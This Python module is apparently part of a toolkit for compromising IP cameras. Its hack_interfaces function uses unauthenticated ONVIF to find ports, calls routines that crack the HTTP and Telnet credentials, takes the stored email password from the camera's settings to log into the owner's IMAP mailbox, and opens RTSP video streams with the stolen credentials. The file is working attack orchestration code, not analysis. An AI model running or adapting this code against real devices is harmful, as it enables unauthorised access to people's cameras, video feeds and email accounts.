from .. import scripts
from .. import interfaces
from ..interfaces.http import parameters as http_params
from .. import decorators
import logging

"""
Imports:
    ..scripts
    ..interfaces
    ..interfaces.http.parameters as http_params
    ..decorators
    logging

Contains:
    hack_interfaces

Variables defined here:
    multicast
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

multicast = interfaces.Multicast()

@decorators.debug()
def hack_interfaces(host, onvif_port=interfaces.onvif.constants.DEFAULT_PORT):
    """
    Hacks as many interfaces as possible.

    Returns: a dictionary of:
        '{Titled interface name}': {interface}

    The goal is to hack HTTP, to do this it needs the
    ... HTTP port, which it gets using Onvif
    """

    icmp = interfaces.Icmp(host)

    try:
        ftp = interfaces.Ftp(host) # Extremely likely that FTP is disabled
    except Exception as error:
        logger.debug(f'Ftp instance creation failed: {error}')
        ftp = None

    logger.info('Onvif does not check auth, and cannot be disabled')

    onvif = interfaces.Onvif(host, port=onvif_port)

    http_port = scripts.get_http_port(onvif)

    http_auth = scripts.hack_http_auth(host, http_port)

    if http_auth is None:
        logger.debug \
        (
            'Failed to hack HTTP auth, '
            'this will severely affect the '
            'number of interfaces that can be hacked'
        )

        return \
        {
            'Onvif': onvif,
            'Multicast': multicast,
            'Icmp': icmp,
            'Ftp': ftp,
        }

    http = interfaces.Http(host, port=http_port, **http_auth)

    telnet_auth = scripts.hack_telnet_auth(http) # Likely that Telnet is disabled

    logger.info('On newer camera versions, telnet has been disabled by default')

    if telnet_auth:
        try:
            telnet = interfaces.Telnet(host, **telnet_auth)
        except Exception as error:
            logger.debug(f'Telnet instance creation failed: {error}')
            telnet = None
    else:
        logger.debug('Failed to hack telnet auth')

        telnet = None

    #rtsp_params = http.get_rtsp()

    #rtsp_enabled = bool(int(rtsp_params.get(http_params.RTSP_AUTH_ENABLE)))
    #rtsp_username = rtsp_params.get(http_params.RTSPUSER)
    #rtsp_password = rtsp_params.get(http_params.RTSPPWD)
    #rtsp_port = int(rtsp_params.get(http_params.RTSPPORT))

    #rtsp_auth = \
    #{
    #    'username': rtsp_username, # Will still use http auth
    #    'password': rtsp_password,
    #}

    rtsp_port = scripts.get_rtsp_port(onvif)

    logger.debug(f'Found rtsp port: {rtsp_port}')

    params = http.get_params()

    mail_port = int(params.get(http_params.MAIL_PORT))
    mail_password = params.get(http_params.MAIL_PWD)
    #mail_receiver1 = params.get(http_params.MAIL_RECEIVER1)
    #mail_receiver2 = params.get(http_params.MAIL_RECEIVER2)
    #mail_receiver3 = params.get(http_params.MAIL_RECEIVER3)
    #mail_receiver4 = params.get(http_params.MAIL_RECEIVER4)
    mail_sender = params.get(http_params.MAIL_SENDER)
    mail_server = params.get(http_params.MAIL_SVR)
    mail_user = params.get(http_params.MAIL_USER)
    mail_ssl = bool(int(params.get(http_params.MAILSSL)))

    if mail_sender and mail_server:
        logger.debug \
        (
            'Found mail_sender, mail_server: '
            f'{mail_sender}, {mail_server}'
        )

        imap = interfaces.Imap(mail_sender, mail_password, domain=mail_server)
    else:
        logger.debug('No email settings detected')

        imap = None

    logger.info('RTSP uses HTTP auth and cannot be disabled')

    #if rtsp_enabled:
    rtsp = interfaces.Rtsp(host, **http_auth, port=rtsp_port) # Uses HTTP auth
    #else:
    #    rtsp = None

    data = \
    {
        'Http': http,
        'Icmp': icmp,
        'Onvif': onvif,
        'Telnet': telnet,
        'Ftp': ftp,
        'Multicast': multicast,
        'Imap': imap,
        'Rtsp': rtsp,
    }

    return data
